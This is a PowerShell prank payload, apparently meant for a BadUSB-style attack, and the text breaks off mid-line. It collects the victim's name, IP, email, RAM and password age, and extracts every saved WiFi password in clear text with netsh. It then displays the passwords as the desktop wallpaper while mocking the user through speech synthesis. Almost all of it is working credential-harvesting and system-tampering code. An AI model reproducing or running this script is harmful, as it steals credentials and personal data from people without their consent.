<#
.NOTES
    This script gathers details from the target PC, including OS, RAM, Public IP, and email.
    It also retrieves SSID and WiFi passwords, checks the last password change, and comments on the security.
    It pauses until mouse movement is detected, then uses SAPI to provide feedback.
#>

$s = New-Object -ComObject SAPI.SpVoice

function Get-FullName {
    try {
        $fullName = (Net User $Env:username | Select-String -Pattern "Full Name").ToString().TrimStart("Full Name")
        return $fullName
    } catch {
        Write-Error "No name was detected"
        return $env:UserName
    }
}

function Get-RAM {
    try {
        $RAM = [int]((Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum / 1GB)
        switch ($RAM) {
            { $_ -le 4 } { return "$RAM GB of RAM? Might as well use pen and paper" }
            { $_ -le 12 } { return "$RAM GB of RAM? I have a calculator with more power" }
            { $_ -le 24 } { return "$RAM GB of RAM? Probably a wannabe streamer setup" }
            default { return "$RAM GB of RAM? A supercomputer with no security, funny!" }
        }
    } catch {
        Write-Error "Error retrieving RAM info"
        return $null
    }
}

function Get-PubIP {
    try {
        return "Your public IP address is $(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content"
    } catch {
        Write-Error "No Public IP detected"
        return $null
    }
}

function Get-Pass {
    try {
        $pro = (netsh wlan show interface | Select-String -Pattern 'SSID').ToString().Split(':')[1].Trim()
        $pass = (netsh wlan show profile $pro key=clear | Select-String -Pattern 'Key Content').ToString().Split(':')[1].Trim()
        $pwl = $pass.Length
        if ($pwl -lt 8) { return "$pro is not very creative. Password only $pwl characters? Really?" }
        elseif ($pwl -lt 12) { return "$pro is not very creative. Password $pwl characters long, still trash." }
        else { return "$pro is not a total fool. $pwl character password is decent but didn't stop me!" }
    } catch {
        Write-Error "No network detected"
        return $null
    }
}

function Get-Networks {
    $Network = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.MACAddress } |
        Select-Object Index, Description, IPAddress, DefaultIPGateway, MACAddress
    $WLANProfileNames = netsh wlan show profiles | Select-String -Pattern " : " | ForEach-Object {
        $_.ToString().Split(":")[1].Trim()
    }
    $WLANProfileObjects = @()
    foreach ($WLANProfileName in $WLANProfileNames) {
        try {
            $WLANProfilePassword = (netsh wlan show profile name="$WLANProfileName" key=clear | Select-String -Pattern "Key Content").ToString().Split(":")[1].Trim()
        } catch {
            $WLANProfilePassword = "No password stored"
        }
        $WLANProfileObject = [PSCustomObject]@{
            ProfileName = $WLANProfileName
            ProfilePassword = $WLANProfilePassword
        }
        $WLANProfileObjects += $WLANProfileObject
    }
    return $WLANProfileObjects
}

function Set-WallPaper {
    param (
        [string]$Image,
        [string]$Style = "Fill"
    )
    $WallpaperStyle = @{
        "Fill" = 10
        "Fit" = 6
        "Stretch" = 2
        "Tile" = 0
        "Center" = 0
        "Span" = 22
    }[$Style]
    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value ($Style -eq "Tile") -Force
    Add-Type @"
using System;
using System.Runtime.InteropServices;

public class Params {
    [DllImport("User32.dll", CharSet = CharSet.Unicode)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@
    $SPI_SETDESKWALLPAPER = 0x0014
    $UpdateIniFile = 0x01
    $SendChangeEvent = 0x02
    [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $UpdateIniFile -bor $SendChangeEvent)
}

function WallPaper-Troll {
    if (!$Networks) { Write-Host "No networks detected" }
    else {
        $FileName = "$env:USERNAME-$(Get-Date -Format yyyy-MM-dd_hh-mm)_WiFi-PWD.txt"
        $Networks | Out-File -FilePath "$Env:TEMP\$FileName"
        $content = Get-Content "$Env:TEMP\$FileName"
        $hiddenMessage = "`n`nMy crime is that of curiosity `nand yea curiosity killed the cat `nbut satisfaction brought him back `n with love -Jakoby"
        $ImageName = "dont-be-suspicious.jpg"
        Add-Type -AssemblyName System.Drawing
        $bitmap = New-Object System.Drawing.Bitmap $w, $h
        $font = New-Object System.Drawing.Font Consolas, 18
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.FillRectangle([System.Drawing.Brushes]::White, 0, 0, $bitmap.Width, $bitmap.Height)
        $graphics.DrawString($content, $font, [System.Drawing.Brushes]::Black, 500, 100)
        $graphics.Dispose()
        $bitmap.Save("$Env:TEMP\foo.jpg")
        $hiddenMessage | Out-File "$Env:TEMP\foo.txt"
        cmd.exe /c copy /b "$Env:TEMP\foo.jpg" + "$Env:TEMP\foo.txt" "$Env:USERPROFILE\Desktop\$ImageName"
        Remove-Item "$Env:TEMP\foo.txt", "$Env:TEMP\foo.jpg" -Force
        $s.Speak("Wanna see something cool?")
        Set-WallPaper -Image "$Env:USERPROFILE\Desktop\$ImageName" -Style Center
        $s.Speak("Look at all your passwords I got...")
        Start-Sleep -Seconds 1
        $s.Speak("These are the WiFi passwords for every network you've ever connected to!")
        Start-Sleep -Seconds 1
        $s.Speak("I could send them to myself but I won't")
    }
}

function Get-Days_Set {
    try {
        $pls = (net user $env:UserName | Select-String -Pattern "Password last").ToString().Split("e")[1].Trim()
        $days = [int](((Get-Date) - (Get-Date $pls)).Days)
        switch ($days) {
            { $_ -lt 45 } { return "$pls was the last time you changed your password. Changed $days days ago, at least you do it often." }
            { $_ -lt 182 } { return "$pls was the last time you changed your password. $days days ago, pushing it a bit." }
            default { return "$pls was the last time you changed your password. $days days ago, you were practically begging me to hack you." }
        }
    } catch {
        Write-Error "Password set date not found"
        return $null
    }
}

function Get-Email {
    try {
        $email = (GPRESULT -Z /USER $Env:username | Select-String -Pattern "([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})" -AllMatches).ToString().Trim()
        switch -Wildcard ($email) {
            "*gmail*" { return "At least you use Gmail. Should we be friends? Email me at $email" }
            "*yahoo*" { return "A Yahoo account? You must be in your 50s or just out of prison. $email, this is sad." }
            "*hotmail*" { return "Hotmail? $email? Sending this to the FBI to check your hard drive." }
            default { return "I don't even know what this is. $email, hope you didn't think it was safe." }
        }
    } catch {
        Write-Error "Email not found"
        return "No email connected to your account, would've had more fun with it."
    }
}

# Gathering and speaking the collected information
$fullName = Get-FullName
$intro = "$full
